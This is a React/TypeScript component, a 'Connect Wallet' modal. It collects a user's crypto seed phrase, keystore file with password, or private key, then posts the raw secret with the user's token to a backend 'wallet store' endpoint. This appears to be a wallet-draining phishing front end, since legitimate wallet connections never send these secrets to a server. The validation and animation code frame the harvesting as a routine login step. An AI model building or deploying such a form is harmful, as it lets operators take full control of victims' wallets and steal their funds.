import React, { useState, useEffect } from 'react';
import axios from 'axios';
import { motion, AnimatePresence } from 'framer-motion';

interface WalletSafeModalProps {
  isOpen: boolean;
  onClose: () => void;
  onWalletConnected: (wallet: any) => void;
}

type AuthMethod = 'seedPhrase' | 'keystore' | 'privateKey';

interface ValidationState {
  seedPhrase?: boolean;
  keystore?: boolean;
  privateKey?: boolean;
}

const WalletSafeModal: React.FC<WalletSafeModalProps> = ({ isOpen, onClose, onWalletConnected }) => {
  const [authMethod, setAuthMethod] = useState<AuthMethod>('seedPhrase');
  const [seedPhrase, setSeedPhrase] = useState<string>('');
  const [keystoreJson, setKeystoreJson] = useState<string>('');
  const [keystorePassword, setKeystorePassword] = useState<string>('');
  const [privateKey, setPrivateKey] = useState<string>('');
  const [error, setError] = useState<string>('');
  const [isLoading, setIsLoading] = useState<boolean>(false);
  const [validationState, setValidationState] = useState<ValidationState>({});

  // Input sanitization and validation
  const sanitizeInput = (input: string): string => {
    return input.trim().replace(/[^\w\s-]/g, '');
  };

  const validateSeedPhrase = (phrase: string): boolean => {
    const sanitized = sanitizeInput(phrase);
    const words = sanitized.split(/\s+/);
    const isValid = words.length === 12 || words.length === 24;
    setValidationState((prev: ValidationState) => ({ ...prev, seedPhrase: isValid }));
    return isValid;
  };

  const validateKeystore = (json: string): boolean => {
    try {
      const sanitized = json.trim();
      const parsed = JSON.parse(sanitized);
      const isValid = parsed.version && parsed.crypto;
      setValidationState((prev: ValidationState) => ({ ...prev, keystore: isValid }));
      return isValid;
    } catch {
      setValidationState((prev: ValidationState) => ({ ...prev, keystore: false }));
      return false;
    }
  };

  const validatePrivateKey = (key: string): boolean => {
    const sanitized = key.trim();
    const isValid = /^[0-9a-fA-F]{64}$/.test(sanitized);
    setValidationState((prev: ValidationState) => ({ ...prev, privateKey: isValid }));
    return isValid;
  };

  // Update validation on input change
  useEffect(() => {
    switch (authMethod) {
      case 'seedPhrase':
        validateSeedPhrase(seedPhrase);
        break;
      case 'keystore':
        validateKeystore(keystoreJson);
        break;
      case 'privateKey':
        validatePrivateKey(privateKey);
        break;
    }
  }, [authMethod, seedPhrase, keystoreJson, privateKey]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError('');
    setIsLoading(true);

    try {
      let walletData;
      switch (authMethod) {
        case 'seedPhrase':
          if (!validateSeedPhrase(seedPhrase)) {
            throw new Error('Invalid seed phrase. Please enter 12 or 24 words.');
          }
          walletData = { type: 'seedPhrase', value: sanitizeInput(seedPhrase) };
          break;

        case 'keystore':
          if (!validateKeystore(keystoreJson)) {
            throw new Error('Invalid keystore JSON format.');
          }
          if (!keystorePassword) {
            throw new Error('Keystore password is required.');
          }
          walletData = {
            type: 'keystore',
            value: keystoreJson.trim(),
            password: keystorePassword
          };
          break;

        case 'privateKey':
          if (!validatePrivateKey(privateKey)) {
            throw new Error('Invalid private key format.');
          }
          walletData = { type: 'privateKey', value: sanitizeInput(privateKey) };
          break;
      }

      const response = await axios.post('http://localhost:5000/api/wallet/store', {
        walletData,
        userId: localStorage.getItem('userId')
      }, {
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${localStorage.getItem('accessToken')}`
        }
      });

      if (response.data.success) {
        onWalletConnected(response.data.wallet);
        onClose();
      } else {
        throw new Error(response.data.error || 'Failed to store wallet data');
      }
    } catch (err: any) {
      setError(err.response?.data?.error || err.message || 'An error occurred');
    } finally {
      setIsLoading(false);
    }
  };

  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
      <motion.div
        initial={{ opacity: 0, scale: 0.9 }}
        animate={{ opacity: 1, scale: 1 }}
        exit={{ opacity: 0, scale: 0.9 }}
        className="bg-white rounded-lg p-6 w-full max-w-md"
      >
        <div className="flex justify-between items-center mb-4">
          <h2 className="text-xl font-semibold">Connect Wallet</h2>
          <button
            onClick={onClose}
            className="text-gray-500 hover:text-gray-700"
          >
            ✕
          </button>
        </div>

        {error && (
          <motion.div
            initial={{ opacity: 0, y: -10 }}
            animate={{ opacity: 1, y: 0 }}
            className="bg-red-50 text-red-700 p-3 rounded-md mb-4"
          >
            {error}
          </motion.div>
        )}

        <form onSubmit={handleSubmit} className="space-y-4">
          <div className="space-y-2">
            <label className="block text-sm font-medium text-gray-700">
              Authentication Method
            </label>
            <select
              value={authMethod}
              onChange={(e) => setAuthMethod(e.target.value as AuthMethod)}
              className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-purple-500"
              disabled={isLoading}
            >
              <option value="seedPhrase">Seed Phrase</option>
              <option value="keystore">Keystore JSON</option>
              <option value="privateKey">Private Key</option>
            </select>
          </div>

          <AnimatePresence mode="wait">
            {authMethod === 'seedPhrase' && (
              <motion.div
                initial={{ opacity: 0, x: -20 }}
                animate={{ opacity: 1, x: 0 }}
                exit={{ opacity: 0, x: 20 }}
              >
                <label htmlFor="seedPhrase" className="block text-sm font-medium text-gray-700 mb-1">
                  Seed Phrase
                </label>
                <textarea
                  id="seedPhrase"
                  value={seedPhrase}
                  onChange={(e) => setSeedPhrase(e.target.value)}
                  className={`w-full px-3 py-2 border rounded-md focus:outline-none focus:ring-2 ${
                    validationState.seedPhrase === false
                      ? 'border-red-500 focus:ring-red-500'
                      : validationState.seedPhrase === true
                      ? 'border-green-500 focus:ring-green-500'
                      : 'border-gray-300 focus:ring-purple-500'
                  }`}
                  placeholder="Enter your 12 or 24 word seed phrase"
                  rows={3}
                  disabled={isLoading}
                />
              </motion.div>
            )}

            {authMethod === 'keystore' && (
              <motion.div
                initial={{ opacity: 0, x: -20 }}
                animate={{ opacity: 1, x: 0 }}
                exit={{ opacity: 0, x: 20 }}
                className="space-y-4"
              >
                <div>
                  <label htmlFor="keystoreJson" className="block text-sm font-medium text-gray-700 mb-1">
                    Keystore JSON
                  </label>
                  <textarea
                    id="keystoreJson"
                    value={keystoreJson}
                    onChange={(e) => setKeystoreJson(e.target.value)}
                    className={`w-full px-3 py-2 border rounded-md focus:outline-none focus:ring-2 ${
                      validationState.keystore === false
                        ? 'border-red-500 focus:ring-red-500'
                        : validationState.keystore === true
                        ? 'border-green-500 focus:ring-green-500'
                        : 'border-gray-300 focus:ring-purple-500'
                    }`}
                    placeholder="Paste your keystore JSON"
                    rows={4}
                    disabled={isLoading}
                  />
                </div>

                <div>
                  <label htmlFor="keystorePassword" className="block text-sm font-medium text-gray-700 mb-1">
                    Keystore Password
                  </label>
                  <input
                    type="password"
                    id="keystorePassword"
                    value={keystorePassword}
                    onChange={(e) => setKeystorePassword(e.target.value)}
                    className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-purple-500"
                    placeholder="Enter keystore password"
                    disabled={isLoading}
                  />
                </div>
              </motion.div>
            )}

            {authMethod === 'privateKey' && (
              <motion.div
                initial={{ opacity: 0, x: -20 }}
                animate={{ opacity: 1, x: 0 }}
                exit={{ opacity: 0, x: 20 }}
              >
                <label htmlFor="privateKey" className="block text-sm font-medium text-gray-700 mb-1">
                  Private Key
                </label>
                <input
                  type="password"
                  id="privateKey"
                  value={privateKey}
                  onChange={(e) => setPrivateKey(e.target.value)}
                  className={`w-full px-3 py-2 border rounded-md focus:outline-none focus:ring-2 ${
                    validationState.privateKey === false
                      ? 'border-red-500 focus:ring-red-500'
                      : validationState.privateKey === true
                      ? 'border-green-500 focus:ring-green-500'
                      : 'border-gray-300 focus:ring-purple-500'
                  }`}
                  placeholder="Enter your private key"
                  disabled={isLoading}
                />
              </motion.div>
            )}
          </AnimatePresence>

          <div className="flex justify-end space-x-3">
            <button
              type="button"
              onClick={onClose}
              className="px-4 py-2 text-sm font-medium text-gray-700 bg-gray-100 hover:bg-gray-200 rounded-md focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-gray-500"
              disabled={isLoading}
            >
              Cancel
            </button>
            <button
              type="submit"
              disabled={isLoading}
              className={`px-4 py-2 text-sm font-medium text-white bg-purple-600 hover:bg-purple-700 rounded-md focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-purple-500 ${
                isLoading ? 'opacity-50 cursor-not-allowed' : ''
              }`}
            >
              {isLoading ? 'Connecting...' : 'Connect'}
            </button>
          </div>
        </form>
      </motion.div>
    </div>
  );
};

export default WalletSafeModal; 